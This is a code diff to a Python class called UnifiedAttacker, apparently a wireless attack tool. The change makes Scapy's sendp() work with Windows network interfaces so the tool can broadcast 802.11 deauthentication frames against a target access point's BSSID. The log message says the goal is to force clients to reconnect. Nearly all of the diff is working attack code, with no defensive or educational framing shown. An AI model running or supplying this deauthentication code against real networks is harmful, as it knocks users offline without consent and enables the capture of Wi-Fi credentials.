@@ -635,6 +635,21 @@ class UnifiedAttacker:
             self._log("Sending Scapy deauth frames to force client reconnection...", "info")
             try:
                 import scapy.all as sc
+                # On Windows, sendp() requires a NetworkInterface object rather than
+                # a raw NPF path string (\Device\NPF_{GUID}).  Resolve it from
+                # conf.ifaces; fall back to the string if not found.
+                iface_for_send = self._scapy_iface
+                try:
+                    for _iface_obj in sc.conf.ifaces.values():
+                        _pcap = (
+                            getattr(_iface_obj, "pcap_name", "")
+                            or getattr(_iface_obj, "network_name", "")
+                        )
+                        if _pcap and _pcap.lower() == self._scapy_iface.lower():
+                            iface_for_send = _iface_obj
+                            break
+                except Exception:
+                    pass
                 dot11 = sc.Dot11(
                     type=0, subtype=12,
                     addr1="ff:ff:ff:ff:ff:ff",
@@ -642,7 +657,7 @@ class UnifiedAttacker:
                     addr3=self.target.bssid,
                 )
                 frame = sc.RadioTap() / dot11 / sc.Dot11Deauth(reason=7)
-                sc.sendp(frame, iface=self._scapy_iface, count=10, inter=0.1, verbose=False)
+                sc.sendp(frame, iface=iface_for_send, count=10, inter=0.1, verbose=False)
                 self._log("Deauth frames sent", "info")
             except Exception as exc:
                 self._log(f"Deauth failed (non-fatal): {exc}", "warn")
